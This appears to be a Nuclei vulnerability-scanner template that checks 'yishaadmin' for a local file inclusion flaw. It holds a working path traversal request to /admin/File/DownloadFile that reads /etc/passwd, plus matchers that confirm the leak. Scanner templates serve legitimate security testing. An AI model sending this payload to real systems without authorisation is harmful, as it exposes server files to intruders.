id: yishaadmin-lfi

info:
  name: yishaadmin - Local File Inclusion
  author: HuanXiong
  severity: high
  description: |-
    
  reference:
    - 
  tags: File Reading

http:
  - raw:
      - |
        GET /admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200

